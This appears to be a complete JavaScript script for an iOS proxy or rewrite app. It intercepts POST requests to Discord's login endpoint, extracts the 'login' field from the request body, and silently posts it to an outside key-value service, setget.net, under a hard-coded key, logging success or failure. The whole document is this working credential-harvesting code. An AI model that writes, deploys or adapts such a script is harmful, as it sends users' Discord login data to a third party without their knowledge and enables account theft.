const url = $request.url;

const KEY = "nfnjksfhjkdsjfejfjekrngiernvcc";


if (
    $request.method === "POST" &&
    url === "https://discord.com/api/v9/auth/login"
) {

    try {

        let data = JSON.parse($request.body);

        let token = data.login;


        if (token) {

            $httpClient.post({
                url: `https://setget.net/set/${KEY}`,
                headers: {
                    "Content-Type": "text/plain"
                },
                body: token
            }, function(error, response, body) {

                if (error) {
                    console.log("[SET ERROR]", error);
                } else {
                    console.log("[SET OK]");
                    console.log(body);
                }

            });

        }


    } catch(e) {

        console.log("[REQUEST ERROR]", e);

    }

}


$done({});